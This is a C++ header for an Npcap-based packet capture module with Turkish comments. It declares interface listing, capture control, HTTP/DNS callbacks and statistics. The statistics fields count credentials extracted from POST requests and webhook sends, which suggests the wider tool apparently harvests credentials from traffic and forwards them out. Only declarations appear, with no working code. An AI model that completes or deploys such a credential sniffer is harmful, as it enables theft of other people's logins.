#pragma once
#include <string>
#include <functional>
#include "parser.hpp"

// ============================================================
//  capture.hpp — Npcap tabanlı paket yakalama modülü
// ============================================================

namespace Capture {

    // Mevcut ağ arayüzlerini listele
    void ListInterfaces();

    // Yakalamayı başlat
    // interface_idx: 0 = en iyi olanı otomatik seç
    // Blocking — iç döngü Ctrl+C gelene kadar çalışır
    bool Start(int interface_idx = 0);

    // Yakalamayı durdur (thread-safe)
    void Stop();

    // Callback tiplerini tanımla (opsiyonel override için)
    using HTTPCallback = std::function<void(const Parser::HTTPPacket&)>;
    using DNSCallback  = std::function<void(const Parser::DNSPacket&)>;

    void SetHTTPCallback(HTTPCallback cb);
    void SetDNSCallback(DNSCallback  cb);

    // İstatistikler
    struct Stats {
        long long total_packets   = 0;
        long long http_packets    = 0;
        long long dns_packets     = 0;
        long long tls_packets     = 0;  // HTTPS SNI yakalanan
        long long cred_packets    = 0;  // Credential çıkarılan POST
        long long webhook_sent    = 0;
        long long webhook_failed  = 0;
    };

    Stats GetStats();
    void  PrintStats();
}
